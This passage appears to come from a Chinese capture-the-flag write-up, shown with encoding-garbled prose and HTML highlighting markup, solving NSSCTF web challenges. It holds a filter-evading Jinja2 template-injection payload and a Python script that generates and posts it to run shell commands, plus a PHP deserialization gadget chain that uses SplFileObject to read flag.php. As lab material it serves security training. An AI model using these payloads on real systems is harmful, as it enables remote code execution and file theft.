operator">|</span>join <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># items</span><span class="token comment"># Â∞Ü‰∏äÈù¢ÊûÑÈÄ†ÁöÑÂ≠óÁ¨¶ÊàñÂ≠óÁ¨¶‰∏≤ÊãºÊé•Ëµ∑Êù•ÊûÑÈÄ†Âá∫ __import__('os').popen('cat /flag').read(): </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token builtin">set</span> pld <span class="token operator">=</span> xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>imp<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>so<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>pon<span class="token operator">~</span>left<span class="token operator">~</span>yin<span class="token operator">~</span>ca<span class="token operator">~</span>space<span class="token operator">~</span>slas<span class="token operator">~</span>flg<span class="token operator">~</span>yin<span class="token operator">~</span>right<span class="token operator">~</span>point<span class="token operator">~</span>red<span class="token operator">~</span>left<span class="token operator">~</span>right <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token comment"># ÁÑ∂ÂêéÂ∞Ü‰∏äÈù¢ÊûÑÈÄ†ÁöÑÂêÑÁßçÂèòÈáèÊ∑ªÂä†Âà∞SSTI‰∏áËÉΩpayloadÈáåÈù¢Â∞±Ë°å‰∫Ü: </span><span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> f<span class="token punctuation">,</span>v <span class="token keyword">in</span> <span class="token punctuation">(</span>whoami<span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>ini<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>xhx<span class="token operator">~</span>xhx<span class="token operator">~</span>glo<span class="token operator">~</span>xhx<span class="token operator">~</span>xhx<span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># globals</span>    <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> f <span class="token operator">==</span> bul <span class="token operator">%</span><span class="token punctuation">&#125;</span>         <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">for</span> a<span class="token punctuation">,</span>b <span class="token keyword">in</span> <span class="token punctuation">(</span>v<span class="token operator">|</span>attr<span class="token punctuation">(</span>itm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># builtins</span>            <span class="token punctuation">&#123;</span><span class="token operator">%</span> <span class="token keyword">if</span> a <span class="token operator">==</span> ev <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval</span>                <span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>b<span class="token punctuation">(</span>pld<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>    <span class="token comment"># eval("__import__('os').popen('cat /flag').read()")</span>                <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span>    <span class="token punctuation">&#123;</span><span class="token operator">%</span> endif <span class="token operator">%</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token operator">%</span> endfor <span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËøòÊúâ‰∏Ä‰∏™Â§ß‰Ω¨ÂÜôÁöÑËÑöÊú¨</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://node6.anna.nssctf.cn:28298/get_flag"</span><span class="token comment">#ËÆ∞ÂæóÊîπÂú∞ÂùÄ</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>num <span class="token operator">//=</span> <span class="token number">10</span>index <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span><span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#return re.findall(f"h3>(.*?)&lt;/h3", response.text, re.S)[0].strip()</span>c <span class="token operator">=</span> <span class="token string">'cat /flag'</span><span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Ê≥ÑÈú≤ÁöÑ‰º™Ë£Ö"><a href="#Ê≥ÑÈú≤ÁöÑ‰º™Ë£Ö" class="headerlink" title="Ê≥ÑÈú≤ÁöÑ‰º™Ë£Ö"></a>Ê≥ÑÈú≤ÁöÑ‰º™Ë£Ö</h3><p><img src="https://img-blog.csdnimg.cn/4da968b7349444ea8c30fc873afc897b.png" alt="2"><br>‰∏ªÁïåÈù¢‰πüÊ≤°Âï•ÔºåÊâ´‰∏Ä‰∏ãÁõÆÂΩï„ÄÇ<br><img src="https://img-blog.csdnimg.cn/c3c7b6d968f244bc82946f267069f729.png" alt="2"><br>ËÆøÈóÆtest.txt<br><img src="https://img-blog.csdnimg.cn/70c0495b610441e1b57c98ffdc32e62a.png" alt="3"><br>Áü•ÈÅìÊ∫êÁ†Å‰ΩÜË¶ÅÊâæÂà∞ÂØπÂ∫îÁöÑphpÊñá‰ª∂„ÄÇ<br>ËÆøÈóÆ<a href="http://www.rarÂæóÂà∞Ë∑ØÂæÑ/">www.rarÂæóÂà∞Ë∑ØÂæÑ</a><br><img src="https://img-blog.csdnimg.cn/0fe65ed76dc94d7e8465f8d472870158.png" alt="6"><br>burpÊäìÂåÖ‰º™ÂçèËÆÆËØªÂèñ<br><img src="https://img-blog.csdnimg.cn/2dd20719f6054e4b8b4d753112d67505.png" alt="7"></p><h3 id="ÂèçÊñπÂêëÁöÑÈíü"><a href="#ÂèçÊñπÂêëÁöÑÈíü" class="headerlink" title="ÂèçÊñπÂêëÁöÑÈíü"></a>ÂèçÊñπÂêëÁöÑÈíü</h3><p>ÂèçÂ∫èÂàóÂåñ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// flag.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$rank</span><span class="token punctuation">,</span><span class="token variable">$salary</span> <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">salary</span> <span class="token operator">=</span> <span class="token variable">$salary</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span><span class="token operator">-></span><span class="token function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'d'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ËØ¥Â≠òÂú®flag.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$leader</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hahaha</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'one class'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'ing'</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">!=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊàêÁ´ãÊù°‰ª∂Ôºö<code>name=&quot;one class&quot;,leader=&quot;ing&quot;,rank=&quot;department&quot;</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$department</span><span class="token punctuation">,</span><span class="token variable">$ceo</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token variable">$department</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span> <span class="token variable">$ceo</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">IPO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'ong'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Pretty Good ! Ctfer!\n"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊàêÁ´ãÊù°‰ª∂Ôºö<code>headmaster=&quot;ong&quot;</code><strong>a‰º†ÂÖ•‰∏Ä‰∏™ÊñπÊ≥ïÔºåb‰º†ÂÖ•ÂëΩ‰ª§</strong>ÔºåphpÂÜÖÁΩÆÊñπÊ≥ï<strong>SplFileObject</strong>ÂèØ‰ª•ËØªÂèñÊñá‰ª∂Ôºåb‰º†ÂÖ•‰º™ÂçèËÆÆËØªÂèñflag.phpÊñá‰ª∂„ÄÇ<br>ÊûÑÈÄ†‰ª£Á†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// flag.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">teacher</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$rank</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ing'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">rank</span> <span class="token operator">=</span><span class="token string single-quoted-string">'department'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">classroom</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$leader</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span><span class="token string single-quoted-string">'one class'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">leader</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">teacher</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">school</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$department</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$headmaster</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">department</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">classroom</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">headmaster</span> <span class="token operator">=</span><span class="token string single-quoted-string">'ong'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">school</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" 